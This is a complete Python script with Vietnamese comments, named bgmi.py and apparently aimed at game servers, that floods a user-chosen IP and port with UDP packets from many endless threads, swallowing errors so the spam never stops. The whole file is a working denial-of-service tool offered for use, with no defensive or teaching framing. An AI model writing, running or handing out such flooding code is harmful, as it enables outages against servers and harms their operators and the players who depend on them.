#!/usr/bin/env python3
import sys
import socket
import threading

# Kiểm tra số tham số
if len(sys.argv) < 5:
    print("Usage: ./bgmi.py <IP> <PORT> <PACKET_SIZE> <NUM_THREADS>")
    sys.exit(1)

IP = sys.argv[1]
PORT = int(sys.argv[2])
PACKET_SIZE = int(sys.argv[3])
NUM_THREADS = int(sys.argv[4])

data = bytearray(PACKET_SIZE)

def spam():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:  # Vòng lặp vô hạn
        try:
            sock.sendto(data, (IP, PORT))
        except:
            pass  # bỏ qua lỗi để spam liên tục

threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=spam)
    t.daemon = True  # thread chạy ngầm
    t.start()
    threads.append(t)

# Giữ main thread chạy để các thread spam tiếp tục
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\nStopped by user")
